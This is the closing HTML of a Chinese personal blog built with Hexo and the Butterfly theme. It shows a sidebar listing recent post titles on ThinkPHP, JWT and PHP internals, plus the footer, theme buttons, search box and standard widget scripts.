title="ThinkPHP">ThinkPHP</a><time datetime="2025-04-14T08:53:45.000Z" title="发表于 2025-04-14 16:53:45">2025-04-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/14/JWT-1/" title="JWT">JWT</a><time datetime="2025-04-14T08:51:00.000Z" title="发表于 2025-04-14 16:51:00">2025-04-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/14/PHP-GC%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/" title="PHP_GC垃圾回收机制">PHP_GC垃圾回收机制</a><time datetime="2025-04-14T08:50:14.000Z" title="发表于 2025-04-14 16:50:14">2025-04-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/14/PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/" title="PHP魔术方法">PHP魔术方法</a><time datetime="2025-04-14T08:49:31.000Z" title="发表于 2025-04-14 16:49:31">2025-04-14</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/beijing.png);"><div id="footer-wrap"><div class="copyright">&copy;2025 By 向每个梦想加速</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="true" data-text="MING,LOVE,ME" data-fontsize="10px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
